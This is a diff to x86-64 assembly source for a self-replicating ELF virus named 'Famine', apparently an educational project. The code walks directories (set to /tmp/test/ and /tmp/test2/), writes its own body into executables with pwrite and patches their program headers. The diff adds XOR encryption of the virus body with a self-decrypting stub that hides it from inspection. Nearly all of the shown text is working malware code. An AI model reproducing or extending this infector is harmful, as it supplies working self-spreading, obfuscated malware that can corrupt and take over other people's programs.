@@ -5,48 +5,20 @@ global  _start                              ;must be declared for linker (ld)
 
 _start:   ;Entry-Point
 PUSH
-;jmp .fork_quick
-xor r11, r11
-
-mov rdi, 0xAABBCCDD  ; key
-mov rax, .enc_start
-lea rdx, [rel .enc_start]
-mov rcx, enc_end
-sub rcx, rax
-.cypher:
-	mov r11b, byte [rdx]
-	xor r11, rdi
-	mov byte [rdx], r11b
-	inc rdx
-	loop .cypher
-
-xor r11, r11
-
-mov rdi, 0xAABBCCDD  ; key
-mov rax, .enc_start
-lea rdx, [rel .enc_start]
-mov rcx, enc_end
-sub rcx, rax
-.decypher:
-	mov r11b, byte [rdx]
-	xor r11, rdi
-	mov byte [rdx], r11b
-	inc rdx
-	loop .decypher
+jmp .enc_start
+DECYPHER
 
 .enc_start:
-.fork_quick:
-	mov rax, _fork
-	syscall
-	cmp rax, 0
-	POP
-	jne _exx
+;	mov rax, _fork
+;	syscall
+;	cmp rax, 0
+;	POP
+;	jne _exx
 
 	mov rbp, rsp
  	sub rbp, famine_size  ; reserve famine_size bytes on the stack
-	
 	lea rdi, [rel infect_dir] ; load dir str
-	
+
 .opendir:
 	mov r14, rdi
 	mov rsi, O_RDONLY | O_DIRECTORY
@@ -236,17 +208,36 @@ inject_self:
 	pop r13
 	sub r13, .delta
 	
-	;write v
-	mov rdi, STACK(famine.file_fd) ; fd to rdi
-	lea rsi, [r13 + _start] ; load _start to rsi
+	;cypher and write v
+	lea rsi, [r13 + _start] ; load _start addr to rsi
 	mov rdx, _end - _start  ; virus size to rdx
-	mov r10, rax ; rax hold eof from lseek syscall 
+	lea r10, STACK(famine.tocypher)
+	.loading_v:
+		mov r11b, byte[rsi]
+		mov [r10], r11b
+		inc rsi
+		inc r10
+		dec rdx
+		cmp rdx, 0
+		jg .loading_v
+	CYPHER
+	mov rdi, STACK(famine.file_fd) ; fd to rdi
+	lea rsi, STACK(famine.tocypher)
+	mov rdx, _end - _start  ; virus size to rdx
+	pop r10 ; rax hold eof from lseek syscall 
+	push r10
 	mov rax, _pwrite
 	syscall
-	
+
 	cmp rax, 0
 	jbe .return
-	
+
+	mov rax, _pwrite			;OVERWRITE THE JUMP OVER DECYPHER METHOD WITH VALUE 0
+	lea rsi, [rel signature]
+	mov rdx, 1
+	add r10, 25
+	syscall
+
 	.edit_phdr:
 	pop rax				;RDI = the offset of patched PHEADER
 	pop rdi
@@ -324,7 +315,7 @@ inject_self:
 infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
 enc_end:
 	db 0
-signature		db			'Famine version 99.0 (c)oded by <araout>', 0xa
+signature		db			0x00, 'Famine version 99.0 (c)oded by <araout>', 0xa, 0x00
 famine_entry	dq			_start
 
 _exx:
